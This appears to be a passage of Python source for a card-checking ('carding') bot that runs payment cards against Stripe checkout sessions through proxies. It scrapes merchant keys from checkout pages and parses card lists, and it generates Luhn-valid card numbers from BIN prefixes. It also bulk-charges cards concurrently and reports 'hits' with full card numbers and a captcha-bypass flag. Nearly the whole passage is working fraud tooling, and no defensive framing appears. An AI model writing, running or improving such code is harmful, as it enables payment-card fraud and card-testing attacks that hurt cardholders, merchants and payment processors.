        result = await charge_card(card, checkout_info, proxy_str)

        final_result = {
            "status": result.get("status", "UNKNOWN"),
            "response": result.get("response", "No response from gateway"),
            "merchant": checkout_info.get("merchant", "Unknown"),
            "product": checkout_info.get("product", "Unknown"),
            "amount": f"{checkout_info.get('price', '0.00')} {checkout_info.get('currency', '')}",
            "receipt_url": result.get("receipt_url"),
            "success_url": result.get("success_url") or checkout_info.get("success_url"),
            "time": result.get("time", 0),
            "bin_info": result.get("bin_info"),
            "code": result.get("code", "unknown"),
            "decline_code": result.get("decline_code", "N/A"),
            "secondary_response": result.get("secondary_response", ""),
            "captcha_bypassed": result.get("captcha_bypassed", False)
        }

        print(f"[CO] Final: {final_result['status']} - {final_result['response']} ({final_result['time']}s)")
        return final_result

    try:
        result = await asyncio.wait_for(_do_check(), timeout=120.0 if use_browser_fallback else 75.0)
        if not result.get("response"):
            result["response"] = "No response from gateway"
        return result
    except asyncio.TimeoutError:
        elapsed = round(time.perf_counter() - start_time, 2)
        return {
            "status": "ERROR",
            "response": f"Gateway timeout after {elapsed}s - proxy may be slow or blocked",
            "merchant": "Unknown",
            "product": "Unknown",
            "amount": "0.00",
            "time": elapsed
        }
    except asyncio.CancelledError:
        elapsed = round(time.perf_counter() - start_time, 2)
        return {
            "status": "ERROR",
            "response": "Request cancelled",
            "merchant": "Unknown",
            "product": "Unknown",
            "amount": "0.00",
            "time": elapsed
        }
    except Exception as e:
        elapsed = round(time.perf_counter() - start_time, 2)
        err_msg = str(e)[:100] if str(e) else "Unknown error"
        return {
            "status": "ERROR",
            "response": err_msg,
            "merchant": "Error",
            "product": "Error",
            "amount": "0.00",
            "time": elapsed
        }


async def try_all_approaches(pk: str, cs: str, card: dict, proxy_str: str = None, custom_email: str = None) -> dict:
    checkout_data = {
        "pk": pk,
        "cs": cs,
        "url": f"https://checkout.stripe.com/c/pay/{cs}",
        "init_data": None
    }
    checkout_info = await get_checkout_info(checkout_data["url"], proxy_str)
    checkout_data["init_data"] = checkout_info.get("init_data")
    checkout_data["pk"] = checkout_info.get("pk") or pk
    if checkout_info.get("stripe_account"):
        checkout_data["stripe_account"] = checkout_info["stripe_account"]
    if not checkout_data["init_data"]:
        return {
            "status": "ERROR",
            "response": checkout_info.get("error", "Could not initialize checkout"),
            "approach": "Direct API",
            "time": checkout_info.get("time", 0)
        }
    result = await charge_card(card, checkout_data, proxy_str, custom_email)
    result["approach"] = "Direct API"
    return result


async def fetch_checkout_page_data(url_or_cs: str) -> dict:
    result = {"pk": None, "merchant": None, "price": None, "currency": None, "stripe_account": None}
    try:
        urls_to_try = []
        if url_or_cs.startswith("http"):
            urls_to_try.append(url_or_cs.split('#')[0])
        if url_or_cs.startswith("cs_"):
            urls_to_try.append(f"https://checkout.stripe.com/c/pay/{url_or_cs}")
        else:
            cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url_or_cs)
            if cs_match:
                urls_to_try.append(f"https://checkout.stripe.com/c/pay/{cs_match.group(0)}")
        s = await get_session()
        for url in urls_to_try:
            try:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=10), allow_redirects=True) as r:
                    page_html = await r.text()
                    pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', page_html)
                    if pk_match:
                        result["pk"] = pk_match.group(0)
                    if not result["stripe_account"]:
                        acct_match = re.search(r'"(acct_[A-Za-z0-9]{6,})"', page_html) or \
                                     re.search(r'(acct_[A-Za-z0-9]{6,})', page_html)
                        if acct_match:
                            result["stripe_account"] = acct_match.group(1)
                    title_match = re.search(r'<title>([^<]+)</title>', page_html)
                    if title_match:
                        title = title_match.group(1)
                        if ' - ' in title:
                            result["merchant"] = title.split(' - ')[0].strip()
                        elif 'Checkout' not in title and 'Stripe' not in title:
                            result["merchant"] = title.strip()
                    if not result["merchant"]:
                        for pattern in [r'"display_name"\s*:\s*"([^"]+)"', r'"business_name"\s*:\s*"([^"]+)"', r'"name"\s*:\s*"([^"]+)"']:
                            match = re.search(pattern, page_html)
                            if match and len(match.group(1)) > 2 and match.group(1) not in ['card', 'payment']:
                                result["merchant"] = match.group(1)
                                break
                    price_patterns = [
                        r'"total"\s*:\s*(\d+)', r'"amount"\s*:\s*(\d+)', r'"unit_amount"\s*:\s*(\d+)',
                        r'"amount_total"\s*:\s*(\d+)', r'"amount_subtotal"\s*:\s*(\d+)',
                    ]
                    for pattern in price_patterns:
                        match = re.search(pattern, page_html)
                        if match:
                            val = int(match.group(1))
                            result["price"] = val / 100 if val > 100 else val
                            if result["price"] > 0:
                                break
                    currency_patterns = [
                        r'"currency"\s*:\s*"([a-z]{3})"', r'"presentment_currency"\s*:\s*"([a-z]{3})"',
                    ]
                    for pattern in currency_patterns:
                        currency_match = re.search(pattern, page_html, re.IGNORECASE)
                        if currency_match:
                            result["currency"] = currency_match.group(1).upper()
                            break
                    if result["merchant"] or result["price"]:
                        break
            except:
                continue
    except Exception as e:
        print(f"[DEBUG] fetch_checkout_page_data error: {e}")
    return result

async def fetch_pk_from_checkout_page(cs: str) -> str:
    data = await fetch_checkout_page_data(cs)
    return data.get("pk")


def parse_card(text: str) -> dict:
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        return None
    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        return None
    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        return None
    return {"cc": cc, "month": month, "year": year, "cvv": cvv}

def parse_cards(text: str) -> list:
    cards = []
    for line in text.strip().split('\n'):
        line = line.strip()
        if line:
            card = parse_card(line)
            if card:
                cards.append(card)
    return cards

def format_checkout_info(info: dict) -> str:
    sym = get_currency_symbol(info.get("currency", "USD"))
    price = info.get("price")
    price_str = f"{sym}{price:.2f}" if price else "N/A"
    merchant = html.escape(str(info.get('merchant') or 'Unknown'))
    product = html.escape(str(info.get('product') or 'N/A'))
    country = html.escape(str(info.get('country') or 'N/A'))
    mode = html.escape(str(info.get('mode') or 'PAYMENT'))
    pk = html.escape(str(info.get('pk', 'N/A'))[:30])
    cs = html.escape(str(info.get('cs', 'N/A'))[:25])
    is_trial = info.get("is_trial", False)
    text = f"""🎯 <b>STRIPE CHECKOUT INFO</b>

━━━━━━━━━━━━━━━━━━━━━━

🏢 <b>Merchant:</b> {merchant}
💰 <b>Amount:</b> {price_str} {info.get('currency', '')}
📦 <b>Product:</b> {product}
🌍 <b>Country:</b> {country}
📧 <b>Mode:</b> {mode}"""
    if is_trial:
        text += "\n\n🆓 <b>FREE TRIAL DETECTED</b>"
        trial_days = info.get("trial_period_days")
        if trial_days:
            text += f"\n📅 <b>Trial Period:</b> {trial_days} days"
        trial_end = info.get("trial_end")
        if trial_end:
            try:
                from datetime import datetime
                end_dt = datetime.fromtimestamp(trial_end)
                text += f"\n📅 <b>Trial Ends:</b> {end_dt.strftime('%Y-%m-%d')}"
            except:
                text += f"\n📅 <b>Trial End:</b> {trial_end}"
        after_price = info.get("after_trial_price")
        if after_price:
            text += f"\n💳 <b>After Trial:</b> {after_price}"
        if info.get("setup_intent"):
            text += "\n🔧 <b>Type:</b> SetupIntent (card saved for later)"
    text += f"""

━━━━━━━━━━━━━━━━━━━━━━

🔑 <b>PK:</b> <code>{pk}...</code>
🔐 <b>CS:</b> <code>{cs}...</code>

━━━━━━━━━━━━━━━━━━━━━━

⏱️ <b>Time:</b> {info.get('time', 0)}s"""
    if info.get('error'):
        text += f"\n⚠️ <b>Note:</b> {html.escape(str(info['error']))}"
    return text

def mask_card(card: dict) -> str:
    cc = card.get('cc', '')
    if len(cc) >= 10:
        masked = f"{cc[:6]}****{cc[-4:]}|{card.get('month', '00')}|{card.get('year', '00')}"
    else:
        masked = f"{cc}|{card.get('month', '00')}|{card.get('year', '00')}"
    return masked

def full_card(card: dict) -> str:
    return f"{card.get('cc', '')}|{card.get('month', '00')}|{card.get('year', '00')}|{card.get('cvv', '000')}"

def format_card_result(result: dict, card: dict, info: dict = None) -> str:
    status = result.get("status", "ERROR")
    code = result.get("code", "unknown")
    decline_code = result.get("decline_code", "N/A")
    response = result.get("response", "N/A")
    if status == "CHARGED":
        status_text = "Charged ✅"
    elif status == "3DS_REQUIRED":
        status_text = "3DS Live 🔐"
    elif status == "DECLINED":
        status_text = "Declined ❌"
    elif status == "CAPTCHA":
        status_text = "CAPTCHA ⚠️"
    else:
        status_text = f"{status} ⚠️"
    text = f"""🚀 Card ➜ {full_card(card)}
⌚ Status ➜ {status_text}
⚡ Code ➜ {code}
※ Declined Code ➜ {decline_code}
❖ Response ➜ {response}
───────────────"""
    return text

def format_mass_summary(hits: int, declines: int, processed: int, total: int) -> str:
    return f"""📊 Summary:
✅ Hits: {hits}
❌ Declines: {declines}
📝 Total: {processed}/{total}"""

def format_charge_result(result: dict, info: dict, card: dict = None) -> str:
    status = result.get("status", "ERROR")
    sym = get_currency_symbol(info.get("currency", "USD"))
    price = info.get("price")
    price_str = f"{sym}{price:.2f}" if price else "N/A"
    currency = info.get('currency', 'USD')
    code = html.escape(str(result.get("code", "N/A")))
    decline_code = html.escape(str(result.get("decline_code", "N/A")))
    response_text = html.escape(str(result.get('response', 'N/A')))
    if status == "CHARGED":
        status_text = "✅ Charged"
    elif status == "3DS_REQUIRED":
        status_text = "🔐 3DS Live"
    elif status == "DECLINED":
        status_text = "❌ Declined"
    elif status == "CAPTCHA":
        status_text = "⚠️ CAPTCHA"
    else:
        status_text = f"⚠️ {html.escape(str(status))}"
    card_str = f"<code>{full_card(card)}</code>" if card else "N/A"
    merchant = html.escape(str(info.get('merchant') or 'Unknown'))
    text = f"""🚀 Card ➜ {card_str}
⌚️ Status ➜ {status_text}
⚡️ Code ➜ {code}
※ Declined Code ➜ {decline_code}
❖ Response ➜ {response_text}
───────────────
🏢 Merchant: {merchant}
💰 Amount: {price_str} {currency}
⏱️ Time: {result.get('time', 0)}s"""
    return text


# ── Saved BINs ────────────────────────────────────────────────────────────────

SAVED_BINS_FILE = "data/saved_bins.json"


def _load_saved_bins() -> dict:
    try:
        with open(SAVED_BINS_FILE, 'r') as f:
            return json.load(f)
    except Exception:
        return {}


def _save_bins_file(data: dict):
    os.makedirs("data", exist_ok=True)
    with open(SAVED_BINS_FILE, 'w') as f:
        json.dump(data, f, indent=2)


def save_user_bin(user_id: int, name: str, bin_value: str) -> bool:
    data = _load_saved_bins()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {}
    data[uid][name.lower()] = bin_value
    _save_bins_file(data)
    return True


def get_user_saved_bins(user_id: int) -> list:
    data = _load_saved_bins()
    uid = str(user_id)
    bins = data.get(uid, {})
    return [{"name": k, "bin_value": v} for k, v in bins.items()]


def delete_user_bin(user_id: int, name: str) -> bool:
    data = _load_saved_bins()
    uid = str(user_id)
    if uid in data and name.lower() in data[uid]:
        del data[uid][name.lower()]
        _save_bins_file(data)
        return True
    return False


# ── Card generation (Luhn-valid) ──────────────────────────────────────────────

def _luhn_complete(partial: str) -> str:
    """Append the check digit that makes partial a Luhn-valid number."""
    digits = [int(d) for d in partial]
    for d in range(10):
        candidate = digits + [d]
        total = 0
        parity = len(candidate) % 2
        for i, digit in enumerate(candidate):
            if i % 2 == parity:
                digit *= 2
                if digit > 9:
                    digit -= 9
            total += digit
        if total % 10 == 0:
            return partial + str(d)
    return None


def parse_gen_input(text: str):
    """
    Parse BIN gen input. Format: <prefix>[|mm|yy|cvv]
    Returns (prefix, mm, yy, cvv_pattern) or None.
    """
    import re
    text = text.strip()
    if not text:
        return None
    fields = re.split(r"[|:/\\\-]", text)
    prefix = re.sub(r"\D", "", fields[0])
    if len(prefix) < 6:
        return None
    mm = fields[1].strip() if len(fields) > 1 and fields[1].strip() else "xx"
    yy = fields[2].strip() if len(fields) > 2 and fields[2].strip() else "xx"
    cvv_pattern = fields[3].strip() if len(fields) > 3 and fields[3].strip() else "xxx"
    return prefix, mm, yy, cvv_pattern


def generate_cards_from_bin(prefix: str, mm: str, yy: str, cvv_pattern: str, count: int = 10) -> list:
    """Generate Luhn-valid cards from a BIN prefix."""
    import random
    is_amex = prefix.startswith("34") or prefix.startswith("37")
    card_len = 15 if is_amex else 16
    cvv_len = 4 if is_amex else 3

    def _is_rand(s):
        return bool(s) and all(c.lower() == "x" for c in s)

    generated = set()
    cards = []
    attempts = 0

    while len(cards) < count and attempts < count * 40:
        attempts += 1
        if len(prefix) >= card_len:
            partial = prefix[:card_len - 1]
        else:
            filler = "".join(str(random.randint(0, 9)) for _ in range(card_len - len(prefix) - 1))
            partial = prefix + filler

        card_num = _luhn_complete(partial)
        if not card_num:
            continue

        card_mm = f"{random.randint(1, 12):02d}" if _is_rand(mm) else (mm.zfill(2) if mm.isdigit() else f"{random.randint(1, 12):02d}")
        if _is_rand(yy):
            card_yy = str(random.randint(25, 32))
        elif yy.isdigit():
            y = yy[2:] if len(yy) == 4 else yy
            card_yy = y if len(y) == 2 else str(random.randint(25, 32))
        else:
            card_yy = str(random.randint(25, 32))

        card_cvv = ("".join(str(random.randint(0, 9)) for _ in range(cvv_len))
                    if _is_rand(cvv_pattern) else
                    (cvv_pattern if cvv_pattern.isdigit() else
                     "".join(str(random.randint(0, 9)) for _ in range(cvv_len))))

        entry = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
        if entry not in generated:
            generated.add(entry)
            cards.append(entry)

    return cards


async def bulk_hit_cards(cards: list, checkout_data: dict,
                         proxy_str: str = None, custom_email: str = None):
    """
    Concurrently hit all cards against a pre-fetched checkout.
    Yields (card_str, result_dict) tuples as each card finishes.
    """
    import asyncio

    def _parse(card_str: str) -> dict:
        parts = card_str.split("|")
        return {
            "cc":    parts[0] if len(parts) > 0 else "",
            "month": parts[1] if len(parts) > 1 else "01",
            "year":  parts[2] if len(parts) > 2 else "25",
            "cvv":   parts[3] if len(parts) > 3 else "000",
        }

    async def _hit_one(card_str: str):
        try:
            result = await charge_card(
                _parse(card_str), checkout_data,
                proxy_str=proxy_str, custom_email=custom_email,
            )
        except Exception as exc:
            result = {"status": "ERROR", "response": str(exc)[:120], "time": 0}
        return card_str, result

    tasks = [asyncio.ensure_future(_hit_one(c)) for c in cards]
    for fut in asyncio.as_completed(tasks):
        yield await fut
